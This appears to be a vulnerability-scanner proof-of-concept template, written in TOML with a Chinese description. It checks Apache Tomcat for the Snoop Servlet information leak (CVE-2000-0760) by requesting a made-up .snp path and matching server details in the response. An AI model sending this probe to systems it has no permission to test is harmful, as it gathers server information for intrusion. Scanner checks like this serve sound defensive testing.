[info]
author = "ave"
description = "通过请求不存在的 .snp 路径触发 Snoop Servlet 返回敏感系统信息，验证目标是否存在信息泄露漏洞"
id = "POC-AVE-2000-0002"
name = "Apache Tomcat Snoop Servlet 信息泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0002"]
vuln_id = [
    "CVE-2000-0760",
    "AVE-2000-0002",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/examples/jsp/snp/anything.snp"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Request Information",
    "Path info",
    "Server name",
    "Remote address",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
